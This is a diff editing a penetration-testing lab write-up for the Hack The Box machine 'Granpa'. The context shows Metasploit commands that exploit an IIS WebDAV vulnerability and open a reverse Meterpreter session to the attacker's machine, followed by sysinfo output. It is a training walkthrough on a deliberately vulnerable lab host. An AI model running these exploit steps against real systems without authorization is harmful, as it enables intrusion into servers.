@@ -268,7 +268,7 @@ msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.
 RHOSTS => 10.10.10.14
 ```
 
-### Run exploit and gain access to the system
+### Run the exploit and gain access to the system
 A really interesting feature of Metasploit modules is that some of them have a _check_ function to verify if the target host is vulnerable:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
@@ -285,7 +285,7 @@ msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
 [*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.14:1030) at 2020-09-20 12:49:01 -0400
 ```
 
-Boom! We have access to the victim server!
+Boom! We have access to the victim server! Get some info from it using `sysinfo`:
 ```
 meterpreter > sysinfo
 Computer        : GRANPA
@@ -296,3 +296,5 @@ Domain          : HTB
 Logged On Users : 2
 Meterpreter     : x86/windows
 ```
+
+
